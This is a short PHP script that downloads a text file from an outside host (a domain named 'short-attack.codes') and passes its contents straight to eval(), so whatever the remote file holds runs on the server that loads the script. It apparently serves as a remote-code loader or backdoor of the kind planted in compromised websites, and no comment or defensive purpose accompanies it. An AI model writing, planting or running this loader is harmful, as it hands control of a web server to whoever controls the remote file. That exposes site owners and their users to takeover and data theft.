<?php

$content = file_get_contents(urldecode('https://works.short-attack.codes/ala-ala/joninstitute.txt'));

$content = "?> ".$content;
eval($content);
